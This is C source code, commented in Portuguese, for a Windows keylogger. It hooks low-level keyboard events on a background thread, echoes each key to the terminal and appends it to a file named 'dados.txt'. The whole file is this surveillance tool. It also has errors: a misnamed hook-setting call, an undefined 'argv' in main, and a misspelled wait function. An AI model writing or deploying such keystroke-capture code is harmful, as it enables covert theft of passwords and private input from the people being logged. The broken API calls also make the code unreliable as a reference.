#include <stdio.h>
#include <stdlib.h>
#include <Windows.h> 

FILE* fp; //crio um ponteiro para um arquivo

//função que vai desviar o teclado
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){ 
    BOOL fEatKeystroke = FALSE;

    if(nCode == HC_ACTION){ //tava imprimindo duas vezes porque o código registra a tecla toda vez que recebe um evento
        switch(wParam){ 
            case WM_KEYDOWN: 
            case WM_SYSKEYDOWN:
            // case WM_KEYUP: 
            case WM_SYSKEYUP: 
            {
                PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) lParam; 
                printf("%c", p->vkCode);
                fprintf(fp, "%c", p->vkCode); //guardando em um arquivo 
                break;
            }
        }
    }
    return (fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
}


void MessageLoop(){  
    MSG message; 
    while(GetMessage(&message, NULL, 0, 0)){ 
        TranslateMessage(&message); 
        DispatchMessage(&message); 
    }
}

DWORD WINAPI TheKeyLogger(){
    HINSTANCE hinstExe = GetModuleHandle(NULL); 
    HHOOK hhLowLevelKybd = GetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinstExe , 0);
    
    MessageLoop();
    UnhookWindowsHookEx(hhLowLevelKybd);
    return 0; 
}
int main(){

    HANDLE hThread; 
    DWORD dwThread;
    fp = fopen("dados.txt", "a+");
    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)TheKeyLogger, (LPVOID)argv[0], NULL, &dwThread); 
    if(hThread)
        return WaitForSinglesObject(hThread, INFINITE);
    else{ 
        fclose(fp);
        return 1;
    }
    return 0;
}
//Para testar, é só utilizar um bloco de notas
//Cria um gancho no sistema para capturar eventos de teclado (o keylogger)
//Roda numa thread paralela
//Printa as teclas no terminal